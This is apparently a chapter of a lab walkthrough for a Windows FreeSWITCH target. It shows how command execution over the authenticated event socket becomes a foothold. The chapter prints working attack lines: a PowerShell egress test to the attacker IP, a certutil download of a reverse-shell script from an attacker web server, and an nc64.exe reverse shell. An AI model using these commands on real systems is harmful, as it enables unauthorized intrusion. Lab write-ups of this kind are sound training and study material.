# 03 — Foothold

There is no web shell and no upload form on this box. The foothold *is* the event socket: authenticated
ESL gives command execution as `OSCP\chris`, which is a shell in everything but name — with two
complications that shape every later command.

| Step | Runs on |
|---|---|
| 3.1 Who am I | Kali → target |
| 3.2 The stateless problem | Kali → target |
| 3.3 Egress test | Kali + target |
| 3.4 Staging files | Kali → target |
| 3.5 A real shell | Kali + target |

---

## 3.1 Who am I

**On Kali**

```bash
python3 1.py 192.168.137.151 "whoami"
```

```
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris
```

The `Content-Length: 11` is worth noticing: `oscp\chris` is 10 bytes, so the extra byte is the
trailing newline and the response is exactly the command output. When a later command returns
`Content-Length: 14`, the body is `-ERR no reply` and nothing was captured (chapter 02).

## 3.2 The stateless problem

Every `api system` call spawns a fresh `cmd.exe` under the FreeSWITCH service and reaps it afterwards.
Nothing survives: not the working directory, not environment changes, not background processes
started in the foreground.

**On Kali**

```bash
python3 1.py 192.168.137.151 "cd \scripts"
python3 1.py 192.168.137.151 "cmd /c cd /d C:\Windows\Temp & cd"
```

```
Authenticated
Content-Type: api/response
Content-Length: 14

-ERR no reply
```

The first call succeeds and prints nothing, so it is indistinguishable from a failure — and the
directory change is gone by the next call either way.

The second call is the interesting one. `&` looks like `cmd.exe` chaining, but over ESL each
segment runs in its own process, so the `cd` never carries to the second command:

```
Authenticated
Content-Type: api/response
Content-Length: 28

C:\Program Files\FreeSWITCH
```

That is the *service* directory, printed by a `cd` that started fresh. Twenty-eight bytes, not the
`C:\Windows\Temp` a single `cmd /c` would have produced.

**Design rule for the rest of the box:** one command per call, absolute paths always, and make the
command *print something* so the response is not `-ERR no reply`.

## 3.3 Egress test

Before building any reverse shell, confirm the target can reach the attacker. This is cheaper than
debugging a payload twice.

**On Kali** — a listener in one terminal:

```bash
nc -lvnp 4451
```

**On Kali** — the test through ESL, in another:

```bash
python3 1.py 192.168.137.151 "powershell -nop -c \"(New-Object Net.Sockets.TcpClient).Connect('192.168.45.158',4451);'ok'\""
```

```
Authenticated
Content-Type: api/response
Content-Length: 3

ok
```

and the listener logs the connection:

```
listening on [any] 4451 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51407
```

The connection **closes immediately** — that is the test working, not failing: the script creates a
socket, prints `ok`, and exits, which disposes the client. A payload that reads from the socket in a
loop is what stays alive.

The same test with a full PowerShell shell payload is what proves the *shell* works. It was delivered
this way and the connection stayed established for as long as the loop was reading:

```
ESTAB  0  0  192.168.45.158:4446  192.168.137.151:51317  users:(("nc",pid=128422,fd=4))
```

## 3.4 Staging files

`C:\Program Files\FreeSWITCH` is the service working directory and a standard user cannot write
there, so everything goes to `C:\Users\chris\AppData\Local\Temp`. `certutil` is present on every
Windows build and does the job without PowerShell:

**On Kali** — serve the file:

```bash
mkdir -p ~/www && cd ~/www && python3 -m http.server 8080
```

**On Kali** — pull it through ESL:

```bash
python3 1.py 192.168.137.151 "certutil -f -urlcache http://192.168.45.158:8080/rev4446.ps1 C:\Users\chris\AppData\Local\Temp\rev4446.ps1"
```

```
Authenticated
Content-Type: api/response
Content-Length: 71

****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Then confirm the file exists rather than trusting the message:

**On Kali**

```bash
python3 1.py 192.168.137.151 "cmd /c dir C:\Users\chris\AppData\Local\Temp\rev4446.ps1"
```

```
 Volume in drive C has no label.
 Volume Serial Number is 949E-5CA2

 Directory of C:\Users\chris\AppData\Local\Temp

11/18/2026  06:31 PM               354 rev4446.ps1
               1 File(s)            354 bytes
               0 Dir(s)  10,123,259,904 bytes free
```

`certutil` reporting success is not proof; the `dir` is. Note also the timestamp:
`06:31 PM` on the target against `14:31` on Kali — the same 7-hour clock skew nmap reported in
chapter 01. It matters when reading target timestamps during enumeration, and it never affected
exploitation.

## 3.5 A real shell

Command execution over ESL is fine for reading files, but it cannot hold an interactive session. The
toolset staged in `Temp` includes `nc64.exe`, and one call turns command execution into a proper
shell:

**On Kali**

```bash
nc -lvnp 4452
```

**On Kali**

```bash
python3 1.py 192.168.137.151 "cmd /c C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4452"
```

```
listening on [any] 4452 ...
connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51412
Microsoft Windows [Version 10.0.19043.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>echo USER=%USERNAME% & whoami
echo USER=%USERNAME% & whoami
USER=chris
oscp\chris

C:\Program Files\FreeSWITCH>
```

Three facts from that transcript:

- **Build `10.0.19043.2130`** — Windows 10 21H2, matching the `19041` product version RDP leaked in
  chapter 01.
- **The prompt is `C:\Program Files\FreeSWITCH`, not `C:\Windows\system32`.** The shell inherits the
  service's working directory, so an unqualified path in this shell resolves somewhere unexpected.
  Absolute paths remain mandatory.
- **`whoami` answers `oscp\chris` here.** It is worth stating explicitly because the same command
  produced *no output at all* in the SYSTEM shell of chapter 05 — the anomaly is specific to that
  context, not a general property of this box.

→ [04 — Enumeration](04-enumeration.md)
